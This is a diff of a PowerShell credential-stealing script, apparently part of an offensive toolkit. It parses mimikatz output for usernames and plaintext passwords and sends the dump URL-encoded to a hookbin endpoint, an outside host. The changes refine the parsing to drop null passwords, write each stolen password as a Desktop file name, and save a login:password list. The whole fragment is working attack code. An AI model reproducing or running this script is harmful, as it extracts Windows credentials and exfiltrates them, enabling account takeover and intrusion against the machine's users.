@@ -28,16 +28,15 @@ $out = Get-Content ./output_mimikatz
 $out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
 (new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}") > $null 2>&1 
 
-cat ./output_mimikatz | select -Index 33
-echo "###############"
-cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
-echo "---------------"
-$password = cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
-echo "PASSWORD = $password"
-$password = $password.substring(1)
-echo "PASSWORD APRES SUBSTRING = $password"
-
-echo $null > "$HOME/Desktop/$password"
+#cat ./output_mimikatz | select -Index 33
+#echo "###############"
+#cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
+#echo "---------------"
+#$password = cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
+#echo "PASSWORD = $password"
+#$password = $password.substring(1)
+#echo "PASSWORD APRES SUBSTRING = $password"
+#echo $null > "$HOME/Desktop/$password"
 
 # dumping every login/password
 $logins = @()
@@ -48,7 +47,7 @@ for ($i = 0; $i -lt $out.length; $i++) {
 	$matchlogin = [string]($out[$i] | Select-String '\* Username : (.+)$' -AllMatches)
   if ($matchlogin -ne "") {
 	  $matchpassword = [string]($out[$i+2] | Select-String '\* Password : (.+)$' -AllMatches)
-    if ($matchpassword -ne "") {
+    if ($matchpassword -ne "" -and $matchpassword -ne "(null)") {
       $logins += $matchlogin.substring($matchlogin.indexof(":")+2)
       $passwords += $matchpassword.substring($matchpassword.indexof(":")+2)
     }
@@ -56,6 +55,8 @@ for ($i = 0; $i -lt $out.length; $i++) {
 }
 for ($i = 0; $i -lt $logins.length; $i++) {
 	$formatted += $logins[$i]+":"+$passwords[$i]+"`n"
+  $p = $passwords[$i]
+  echo $null > "$HOME/Desktop/$p"
 }
 echo $formatted > "$HOME/Desktop/logins"
 
